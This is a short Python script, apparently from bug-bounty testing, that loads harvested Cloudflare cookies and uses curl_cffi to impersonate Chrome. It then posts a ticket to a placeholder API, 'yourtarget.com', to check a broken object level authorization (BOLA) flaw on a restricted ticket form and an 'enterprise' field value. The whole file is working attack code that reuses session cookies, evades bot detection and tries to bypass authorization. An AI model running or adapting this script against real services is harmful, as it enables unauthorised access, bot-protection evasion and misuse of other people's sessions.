import json
from curl_cffi import requests

# Load harvested cookies
cookie_dict = {}
try:
    with open("validation_logs/cf_cookies.txt", "r") as f:
        for line in f:
            if "=" in line:
                parts = line.strip().split(";")[0].split("=", 1)
                if len(parts) == 2:
                    cookie_dict[parts[0].strip()] = parts[1].strip()
except Exception as e:
    print(f"[-] Error loading cookies: {e}")

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json, text/javascript, */*; q=0.01",
}

target_url = "https://yourtarget.com/api/v2/requests.json"

# Payload using dynamic/valid structure mapping
payload = {
    "request": {
        "subject": "BugX Security Assessment - Final BOLA Verification",
        "comment": {
            "body": "Verifying authorization controls on restricted ticket form ID 4518845822874."
        },
        "ticket_form_id": 4518845822874,
        "custom_fields": [
            {
                "id": 4845844546970,
                "value": "enterprise"  # Standard high-tier dropdown value mapping
            }
        ]
    }
}

print(f"[*] Submitting final BOLA payload...")
try:
    res = requests.post(target_url, cookies=cookie_dict, headers=headers, json=payload, impersonate="chrome120", timeout=15)
    print(f"[+] Status Code: {res.status_code}")
    print(f"[+] Response Body: {res.text}")
except Exception as e:
    print(f"[-] Request error: {e}")
